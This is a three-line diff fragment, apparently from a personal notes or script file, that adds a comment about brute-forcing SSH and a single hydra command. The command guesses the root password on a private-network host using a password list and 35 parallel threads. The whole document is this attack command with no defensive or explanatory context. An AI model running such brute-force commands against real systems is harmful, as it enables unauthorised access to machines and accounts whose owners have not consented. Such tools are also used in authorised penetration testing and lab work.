@@ -1,0 +1,3 @@
+
+# Bruto-force the ssh active server
+  hydra 192.168.1.68 ssh2 -l root -P ~/tool/pass.dat -t 35
